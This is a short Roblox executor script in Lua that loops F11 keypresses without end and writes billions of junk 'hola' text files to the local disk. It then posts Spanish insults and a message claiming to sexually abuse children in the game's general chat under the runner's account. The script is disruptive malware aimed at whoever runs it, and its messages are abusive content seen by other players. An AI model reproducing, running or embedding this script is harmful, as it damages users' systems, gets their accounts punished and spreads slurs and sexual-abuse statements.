task.spawn(function()
    while true do
        local RT = cloneref(game:GetService("VirtualInputManager"))
        RT:SendKeyEvent(true, Enum.KeyCode.F11, false, game)
        RT:SendKeyEvent(false, Enum.KeyCode.F11, false, game)
        task.wait()
    end
end)

task.spawn(function()
    for i = 1, 9e9 do
        local nombre = "hola" .. i .. ".txt"
        local contenido = "HIIIIIIIIIII"
        writefile(nombre, contenido)
        task.wait()
    end
end)

local TextChatService = game:GetService("TextChatService")

local chatChannel = TextChatService:FindFirstChild("TextChannels")
if chatChannel then
    chatChannel = chatChannel:FindFirstChild("RBXGeneral")
end

if chatChannel then
    chatChannel:SendAsync("hola putos")
    chatChannel:SendAsync("hola idiotas")
    chatChannel:SendAsync("hola pendejos")
    chatChannel:SendAsync("hola violo niños y la tengo bien grande")
end
